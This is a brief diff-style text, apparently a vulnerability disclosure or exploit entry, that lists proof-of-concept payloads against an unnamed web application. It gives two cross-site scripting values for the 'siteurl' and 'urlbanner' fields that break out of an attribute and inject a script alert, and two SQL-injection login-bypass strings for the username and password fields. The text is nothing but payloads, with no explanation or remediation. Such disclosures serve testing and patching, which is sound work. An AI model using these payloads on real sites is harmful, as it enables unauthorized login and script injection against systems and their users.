@@ -1,0 +1,11 @@
+HTML-injection issue:
+
+&#039;siteurl&#039; : http://&quot;&gt;&lt;script&gt;alert(XSS)&lt;/script&gt;&lt;aa aa=&quot;
+
+&#039;urlbanner&#039; : &quot;&gt;&lt;script&gt;alert(XSS)&lt;/script&gt;&lt;aa aa=&quot;.gif
+
+SQL-injection issue:
+
+username: &#039; or 1#
+
+password: &#039; or &#039;a&#039;=&#039;a
